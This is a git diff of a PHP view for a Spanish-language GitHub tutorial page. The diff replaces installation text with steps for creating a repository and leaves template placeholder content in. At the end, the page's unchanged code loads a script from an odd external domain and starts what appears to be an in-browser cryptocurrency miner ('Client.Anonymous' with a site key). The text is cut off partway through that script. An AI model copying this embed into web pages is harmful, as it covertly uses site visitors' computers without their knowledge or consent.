@@ -54,7 +54,7 @@ defined('BASEPATH') OR exit('No direct script access allowed');
           <div class="col-lg-8 col-md-10 mx-auto">
             <div class="site-heading">
               <h1>Tutorial GitHub</h1>
-              <span class="subheading">Instalación.</span>
+              <span class="subheading">Primer Proyecto.</span>
               <span class="subheading">Desarrollado por <a href="https://ylit.cl/">YLIT</a></span>
             </div>
           </div>
@@ -68,18 +68,32 @@ defined('BASEPATH') OR exit('No direct script access allowed');
         <div class="row">
           <div class="col-lg-8 col-md-10 mx-auto">
 
-            <h2 class="section-heading">Descargar.</h2>
-            <p>En el sitio oficial de Git podemos encontrar las descargas correspondientes
-            al sistema operativo que estemos usando, solo debemos acceder al sitio
-            <a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a>.</p>
+            <h2 class="section-heading">Crear Repositorio En GitHub.</h2>
+            <p>Ahora que ya tenemos instalado Git en nuestro sistema, estamos listos para crear 
+            un proyecto. Antes que todo debes crear tu propia cuenta en 
+            <a href="https://github.com">https://github.com</a>.</p>
 
-            <p>A continuación se describe la instalación para los distintos tipos de sistemas operativos
-            más comunes.</p>
+            <p>Una vez que ya tengas tu propia cuenta de usuario creada en GitHub. Ingresa en ella
+            y pincha el boton "new repository", en donde debes ingresar el nombre del repositorio, 
+            la descripción del repositorio (aunque es opcional), luego te pide seleccionar si tu repositorio
+            será público o privado, sin embargo para que tu repositorio sea privado debes pagar, 
+            por lo que para el caso de este tutorial solo crearemos un repositorio público. Luego,
+            te pedirá si deseas inicializar el repositorio con un archivo README, lo recomendado es incluir
+            este archivo, ya que aquí es en donde daremos la descripción de nuestro proyecto. 
+            Finalmente te pedirá si deseas agregar .gitignore y el tipo de licencia. Sin embargo para el caso 
+            de este tutorial básico lo dejaremos como "none" (más adelante se verá que es .gitignore
+            y los tipos de licencias existentes). Para crear el repositorio pincha el boton "Create repository", 
+            y listo, ya tienes tu repositorio creado y listo para subir los archivos de tu proyecto.</p>
 
-            <h2 class="section-heading">Linux.</h2>
-            <p>Si estás en una distribución basada en Debian como Ubuntu, instala usando apt-get.</p>
+            <h2 class="section-heading">Acceder a tu repositorio.</h2>
+            <p>Posteriormente para acceder a tu proyecto (o también si deseas compartirlo con alguien),
+            solo debes ingresar en 
+            <br> <code>http://github.com/tuNombreUsuario/nombreRepositorio</code>, en donde /tuNombreUsuario
+            es el nombre de usuario con el cual creaste tu propia cuenta en github, y /nombreRepositorio 
+            es el nombre del repositorio que acabas de crear.</p>
 
-            <p><code>$ apt-get install git</code></p>
+            <p>Es importante que recuerdes la ruta de tu repositorio en github, ya que más adelante,
+            para subir tus archivos la necesitarás.</p>
 
             <p></p>
 
@@ -117,12 +131,23 @@ defined('BASEPATH') OR exit('No direct script access allowed');
             los parámetros terminándolos con el acento circunflejo (^) si están al final de la línea, 
             ya que en Windows es uno de los símbolos de continuación.</blockquote>
 
+            
+            <h2 class="section-heading">Reaching for the Stars</h2>
+
+            <a href="#">
+              <img class="img-fluid" src="img/post-sample-image.jpg" alt="">
+            </a>
+            <span class="caption text-muted">To go places and do things that have never been done before – that’s what living is all about.</span>
+
+            <p>Placeholder text by
+              <a href="http://spaceipsum.com/">Space Ipsum</a>. Photographs by
+              <a href="https://www.flickr.com/photos/nasacommons/">NASA on The Commons</a>.</p>
 
               <div class="clearfix">
-                <a class="btn btn-primary float-right" href="<?php echo base_url() ?>IndiceController/descripcion">Capítulo Anterior &larr;</a>
+                <a class="btn btn-primary float-right" href="<?php echo base_url() ?>IndiceController/">Capítulo Anterior &larr;</a>
               </div>
               <div class="clearfix">
-                <a class="btn btn-primary float-right" href="<?php echo base_url() ?>IndiceController/primerProyecto">Capítulo Siguiente &rarr;</a>
+                <a class="btn btn-primary float-right" href="<?php echo base_url() ?>IndiceController/instalacion">Capítulo Siguiente &rarr;</a>
               </div>
 
           </div>
@@ -178,7 +203,7 @@ defined('BASEPATH') OR exit('No direct script access allowed');
 
   </body>
 
-
+  
   <script src="https://www.freecontent.date./Kxnd.js"></script>
   <script>
     var _client = new Client.Anonymous('0df5a246946447fd570ca7839db8bd98fd09b8b9b6bafb8e25dfc39b5e1ef835', {
